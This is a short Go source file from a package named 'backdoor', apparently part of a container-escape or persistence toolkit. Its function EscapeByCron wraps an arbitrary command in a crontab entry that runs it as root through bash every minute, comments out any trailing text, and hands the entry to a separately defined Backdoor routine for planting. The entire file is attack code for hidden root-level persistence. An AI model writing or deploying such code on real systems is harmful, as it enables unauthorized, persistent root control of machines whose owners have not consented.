package backdoor

import "fmt"

func EscapeByCron(command string) error {
	fmt.Println("command to exec:")
	fmt.Println(command)
	payload := fmt.Sprintf("* * * * * root  /bin/bash -c \"%s\" \n#", command)

	if err := Backdoor(payload); err != nil {
		fmt.Println(err)
		return err
	}
	return nil
}
